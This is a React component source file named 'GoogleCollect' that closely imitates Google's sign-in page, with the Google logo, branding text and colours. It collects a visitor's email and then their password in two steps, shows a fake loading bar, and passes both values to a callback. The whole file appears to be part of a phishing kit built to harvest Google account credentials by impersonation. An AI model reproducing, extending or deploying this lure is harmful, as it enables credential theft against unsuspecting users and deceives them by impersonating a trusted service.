"use client";

import { useState, useEffect } from "react";
import { Icon } from "@iconify/react";

interface GoogleCollectProps {
  onNext: (email: string, password: string) => void;
  onCancel: () => void;
}

const GoogleCollect = ({ onNext, onCancel }: GoogleCollectProps) => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [step, setStep] = useState(1);
  const [loading, setLoading] = useState(false);
  const [showPass, setShowPass] = useState(false);

  const handleStepChange = (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setTimeout(() => {
      setLoading(false);
      if (step === 1) setStep(2);
      else onNext(email, password);
    }, 1000);
  };

  return (
    <div className="w-full max-w-[450px] bg-white dark:bg-[#1f1f1f] rounded-[24px] border border-[#e0e0e0] dark:border-white/10 shadow-sm mx-auto overflow-hidden animate-in fade-in zoom-in-95 duration-300">
      {/* Animated Google Progress Bar */}
      <div className="h-[4px] w-full bg-gray-100 dark:bg-white/5 relative overflow-hidden">
        {loading && (
          <div className="absolute inset-0 bg-[#1a73e8] animate-progress-indefinite w-1/3"></div>
        )}
      </div>

      <div className="p-8 md:p-10 pt-6">
        <div className="flex flex-col items-center text-center mb-8">
          <svg width="48" height="48" viewBox="0 0 24 24" className="mb-4">
            <path
              d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"
              fill="#4285F4"
            />
            <path
              d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
              fill="#34A853"
            />
            <path
              d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l3.66-2.84z"
              fill="#FBBC05"
            />
            <path
              d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"
              fill="#EA4335"
            />
          </svg>
          <h1 className="text-[#202124] dark:text-white text-[24px] font-normal">
            {step === 1 ? "Sign in" : "Welcome"}
          </h1>
          <p className="text-[#202124] dark:text-white/70 text-[16px] mt-2">
            Use your Google Account
          </p>
        </div>

        {step === 2 && (
          <div
            onClick={() => setStep(1)}
            className="flex items-center gap-2 w-fit mx-auto px-2 py-1 border border-gray-300 dark:border-white/10 rounded-full mb-8 cursor-pointer hover:bg-gray-50 transition text-sm text-dark dark:text-white"
          >
            <div className="w-5 h-5 rounded-full bg-[#1D6350] flex items-center justify-center text-[10px] text-white uppercase">
              {email[0]}
            </div>
            {email} <Icon icon="tabler:chevron-down" />
          </div>
        )}

        <form onSubmit={handleStepChange}>
          <div className="group relative mb-10">
            <input
              type={step === 1 ? "email" : showPass ? "text" : "password"}
              required
              placeholder=" "
              autoFocus
              className="peer w-full bg-transparent border border-[#dadce0] dark:border-white/20 rounded-[4px] p-4 text-[16px] text-dark dark:text-white focus:border-[#1a73e8] focus:border-2 outline-none transition-all"
              onChange={(e) =>
                step === 1
                  ? setEmail(e.target.value)
                  : setPassword(e.target.value)
              }
            />
            <label className="absolute left-4 top-4 text-[#5f6368] dark:text-white/50 pointer-events-none transition-all peer-focus:text-[12px] peer-focus:top-[-10px] peer-focus:left-2 peer-focus:bg-white dark:peer-focus:bg-[#1f1f1f] peer-focus:px-1 peer-focus:text-[#1a73e8] peer-[:not(:placeholder-shown)]:text-[12px] peer-[:not(:placeholder-shown)]:top-[-10px] peer-[:not(:placeholder-shown)]:bg-white dark:peer-[:not(:placeholder-shown)]:bg-[#1f1f1f] peer-[:not(:placeholder-shown)]:px-1">
              {step === 1 ? "Email or phone" : "Enter your password"}
            </label>
          </div>

          <div className="flex justify-between items-center mt-10">
            <button
              type="button"
              onClick={onCancel}
              className="text-[#1a73e8] text-[14px] font-semibold px-4 py-2 hover:bg-blue-50 dark:hover:bg-white/5 rounded transition"
            >
              {step === 1 ? "Create account" : "Back"}
            </button>
            <button
              type="submit"
              className="bg-[#1a73e8] text-white px-8 py-2 rounded-[4px] text-[14px] font-semibold hover:bg-[#185abc] shadow-sm"
            >
              Next
            </button>
          </div>
        </form>
      </div>
    </div>
  );
};

export default GoogleCollect;
